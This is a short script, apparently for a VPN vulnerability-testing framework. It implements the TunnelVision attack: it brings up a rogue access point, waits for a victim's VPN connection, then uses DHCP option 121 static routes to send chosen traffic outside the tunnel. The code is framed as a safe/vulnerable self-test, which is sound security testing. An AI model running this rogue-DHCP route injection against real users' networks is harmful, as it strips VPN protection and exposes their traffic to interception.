(*
 * Tunnelvision state machine definition
 * We push custom routes over dhcp by means of the classless static route option (121)
 * We abuse the fact that most vpn clients allow traffic to routes other than the default to flow directly.
 * This variant pushes the static route _after_ the vpn tunnel is set up using a dhcp renew.
 *)

state init begin:
  miscnet = miscnet();
  netmask = "255.255.255.0";
  my_ip = "192.168.137.1";
  (* gateway for static route != my_ip -> client can't just ignore it *)
  route_gw_ip = "192.168.137.2";
  (* we want target_ip to flow outside of the tunnel *)
  target_ip = miscnet.lookup_ipv4("vvts.midnightblue.nl");

  (* perform nat on the interface where our default gateway is at *)
  miscnet.masquerade("true");

  ap = accesspoint();
  ap.wifi_interface = "wlan0";
  ap.ipv4_addr = my_ip;
  ap.ipv4_netmask = netmask;
  ap.dhcp4_enable = "true";
  (* don't hand out route_gw_ip to one of our clients *)
  ap.dhcp4_avoid = route_gw_ip;
  ap.dhcp4_dns = my_ip;
  ap.dhcp4_router = my_ip;
  ap.dhcp4_leasetime = "1";
  (* we want arp requests for route_gw_ip to be answered with our mac address,
     which is accomplished by setting route_to_default=true *)
  ap.route_to_default = "true";
  ap.dns_enable = "true";
  ap.bring_up(ap_up, ap_err);

state ap_err:
  exit("failed to bring up access point: ", errstr);

state ap_up:
  mon = trafficmonitor();
  mon.interface = ap.ap_interface;
  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
  mon.vpn_endpoints = "tcp://eduvpn.org:443;udp://eduvpn.org:443;tcp://www.eduvpn.org:443;udp://www.eduvpn.org:443";
  mon.detect_vpn(vpn_detected, mon_err);
  print("[i] Please connect to the vpn on the victim device");

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_detected:
  ap.dhcp4_static_route(target_ip, "255.255.255.0", route_gw_ip);
  ap.dhcp4_reload();
  ap.dhcp4_renew(dhcp_renew);
  print("[i] Waiting for the dhcp lease to renew...");

state dhcp_renew:
  (* make sure validation_server resolves to target_ip *)
  mon.validation_server = "https://vvts.midnightblue.nl:8443/";
  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_safe:
  exit("Your vpn appears to be safe, congratulations!");

state vpn_vuln:
  exit("Your vpn appears to be vulnerable!");
